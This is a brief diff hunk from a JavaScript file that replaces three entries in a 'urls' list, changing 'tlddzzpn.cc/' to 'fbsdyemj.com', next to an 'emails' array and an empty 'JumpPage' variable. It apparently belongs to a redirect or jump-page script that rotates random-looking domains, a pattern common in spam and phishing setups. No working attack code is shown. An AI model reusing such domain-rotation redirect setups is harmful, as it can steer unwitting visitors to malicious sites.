@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'tlddzzpn.cc/', 
-	'tlddzzpn.cc/', 
-    'tlddzzpn.cc/',
+	'fbsdyemj.com', 
+	'fbsdyemj.com', 
+    'fbsdyemj.com',
 ];                                                                                                                  
 
 var JumpPage="";
